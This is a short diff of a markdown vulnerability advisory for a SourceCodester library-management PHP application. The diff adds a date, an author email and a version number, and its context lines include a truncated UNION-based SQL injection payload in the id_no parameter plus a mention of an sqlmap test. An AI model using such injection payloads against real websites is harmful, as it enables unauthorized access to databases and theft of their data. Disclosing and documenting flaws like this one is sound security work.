@@ -2,6 +2,16 @@
 
 
 
+
+
+### Date: 2022-08/05
+
+
+
+### Exploit Author: anx0ing@gmail.com
+
+
+
 ### Vendor Homepage: 
 
 [https://www.sourcecodester.com](https://www.sourcecodester.com/)
@@ -13,6 +23,8 @@
 https://www.sourcecodester.com/php/15434/library-management-system-qr-code-attendance-and-auto-generate-library-card.html
 
 
+
+### Version: 1.0
 
 
 
@@ -43,6 +55,8 @@ id_no=' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7
 **SQLMAP Test**
 
 ![image-20220804234643404](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220804234643404.png)
+
+
 
 
 
